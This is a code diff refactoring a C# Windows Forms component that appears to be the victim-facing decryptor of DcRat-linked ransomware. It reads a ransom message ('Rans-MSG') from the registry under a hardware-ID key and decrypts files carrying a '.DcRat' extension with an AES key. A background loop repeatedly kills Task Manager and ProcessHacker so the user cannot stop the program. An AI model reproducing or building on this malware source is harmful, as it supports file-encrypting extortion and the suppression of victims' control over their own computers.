@@ -2,10 +2,10 @@
 using System.ComponentModel;
 using System.Diagnostics;
 using System.IO;
-using System.Management;
 using System.Runtime.CompilerServices;
 using System.Security.Cryptography;
 using System.Text;
+using System.Threading;
 using Microsoft.VisualBasic;
 using Microsoft.VisualBasic.CompilerServices;
 using Microsoft.Win32;
@@ -15,18 +15,39 @@ namespace DECF
 {
     public partial class Form1
     {
+        private WindowsMediaPlayer _Player;
+        private readonly object C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3);
+        private int FileCount;
+        private int Finished;
+        private bool OK;
+
+        public string Pass;
+        private string userName = Environment.UserName;
+
         public Form1()
         {
             Player = new WindowsMediaPlayer();
             InitializeComponent();
         }
 
-        public string Pass;
-        private int Finished = 0;
-        private int FileCount = 0;
-        private string userName = Environment.UserName;
-        private bool OK = false;
-        private object C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3);
+        private WindowsMediaPlayer Player
+        {
+            [MethodImpl(MethodImplOptions.Synchronized)]
+            get => _Player;
+
+            [MethodImpl(MethodImplOptions.Synchronized)]
+            set
+            {
+                if (_Player != null)
+                {
+                }
+
+                _Player = value;
+                if (_Player != null)
+                {
+                }
+            }
+        }
 
         private void btnDecrypt_Click(object sender, EventArgs e)
         {
@@ -43,12 +64,13 @@ namespace DECF
                     btnDecrypt.Text = "Please Wait...";
                     btnDecrypt.Enabled = false;
                     txtKey.ReadOnly = true;
-                    var D1 = new System.Threading.Thread(Dec);
+                    var D1 = new Thread(Dec);
                     D1.Start();
                 }
             }
             catch (Exception ex)
             {
+                Console.WriteLine(ex.Message);
             }
         }
 
@@ -57,15 +79,17 @@ namespace DECF
             try
             {
                 txtFiles.Text = HWID();
-                txtMSG.Text = Conversions.ToString(Registry.GetValue(@"HKEY_CURRENT_USER\Software\" + HWID(), "Rans-MSG", null));
+                txtMSG.Text =
+                    Conversions.ToString(Registry.GetValue(@"HKEY_CURRENT_USER\Software\" + HWID(), "Rans-MSG", null));
                 BackgroundWorker4.RunWorkerAsync();
             }
             catch (Exception ex)
             {
+                Console.WriteLine(ex.Message);
             }
         }
 
-        
+
         public static string HWID()
         {
             try
@@ -82,16 +106,15 @@ namespace DECF
 
         public static string GetHash(string strToHash)
         {
-            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
-            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
+            var md5Obj = new MD5CryptoServiceProvider();
+            var bytesToHash = Encoding.ASCII.GetBytes(strToHash);
             bytesToHash = md5Obj.ComputeHash(bytesToHash);
-            StringBuilder strResult = new StringBuilder();
-            foreach (byte b in bytesToHash)
+            var strResult = new StringBuilder();
+            foreach (var b in bytesToHash)
                 strResult.Append(b.ToString("x2"));
             return strResult.ToString().Substring(0, 20).ToUpper();
         }
 
-        
 
         public void Dec()
         {
@@ -104,7 +127,7 @@ namespace DECF
                 BackgroundWorker3.WorkerSupportsCancellation = true;
                 BackgroundWorker3.RunWorkerAsync();
                 while (Finished != 3)
-                    System.Threading.Thread.Sleep(50);
+                    Thread.Sleep(50);
                 if (OK)
                 {
                     Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + HWID(), "Rans-Status", "Decrypted");
@@ -119,6 +142,7 @@ namespace DECF
             }
             catch (Exception ex)
             {
+                Console.WriteLine(ex.Message);
             }
         }
 
@@ -156,16 +180,16 @@ namespace DECF
                 if (file.EndsWith(".DcRat"))
                 {
                     var B2Dec = File.ReadAllBytes(file);
-                    var KeyBytes = System.Text.Encoding.UTF8.GetBytes(key);
+                    var KeyBytes = Encoding.UTF8.GetBytes(key);
                     KeyBytes = SHA256.Create().ComputeHash(KeyBytes);
                     var BytesDec = AES_Dec(B2Dec, KeyBytes);
                     File.WriteAllBytes(file, BytesDec);
-                    string exten = Path.GetExtension(file);
-                    string result = file.Substring(0, file.Length - exten.Length);
+                    var exten = Path.GetExtension(file);
+                    var result = file.Substring(0, file.Length - exten.Length);
                     File.Move(file, result);
                     FileCount += 1;
                     OK = true;
-                    txtFiles.AppendText("[" + FileCount.ToString() + "] " + Path.GetFileName(file));
+                    txtFiles.AppendText("[" + FileCount + "] " + Path.GetFileName(file));
                     txtFiles.AppendText(Environment.NewLine);
                 }
             }
@@ -173,7 +197,7 @@ namespace DECF
             {
                 txtFiles.AppendText("[Wrong Key]");
                 txtFiles.AppendText(Environment.NewLine);
-                return;
+                Console.WriteLine(ex.Message);
             }
         }
 
@@ -190,6 +214,7 @@ namespace DECF
             }
             catch (Exception ex)
             {
+                Console.WriteLine(ex.Message);
             }
         }
 
@@ -218,7 +243,7 @@ namespace DECF
                 var Driver = new DriveInfo(drive);
                 if (Driver.DriveType == DriveType.Fixed && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                 {
-                    string DriverPath = drive;
+                    var DriverPath = drive;
                     Dir_Dec(DriverPath, Pass);
                 }
             }
@@ -233,7 +258,7 @@ namespace DECF
                 var Driver = new DriveInfo(drive);
                 if (!(Driver.DriveType == DriveType.Fixed) && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                 {
-                    string DriverPath = drive;
+                    var DriverPath = drive;
                     Dir_Dec(DriverPath, Pass);
                 }
             }
@@ -241,49 +266,22 @@ namespace DECF
             Finished += 1;
         }
 
-        private WindowsMediaPlayer _Player;
-
-        private WindowsMediaPlayer Player
-        {
-            [MethodImpl(MethodImplOptions.Synchronized)]
-            get
-            {
-                return _Player;
-            }
-
-            [MethodImpl(MethodImplOptions.Synchronized)]
-            set
-            {
-                if (_Player != null)
-                {
-                }
-
-                _Player = value;
-                if (_Player != null)
-                {
-                }
-            }
-        }
-                
         private void BackgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
         {
             try
             {
                 while (true)
                 {
-                    foreach (Process x in Process.GetProcesses())
-                    {
+                    foreach (var x in Process.GetProcesses())
                         if ((x.ProcessName ?? "") == "ProcessHacker" || (x.ProcessName ?? "") == "Taskmgr")
-                        {
                             x.Kill();
-                        }
-                    }
 
-                    System.Threading.Thread.Sleep(1000);
+                    Thread.Sleep(1000);
                 }
             }
             catch (Exception ex)
             {
+                Console.WriteLine(ex.Message);
             }
         }
     }
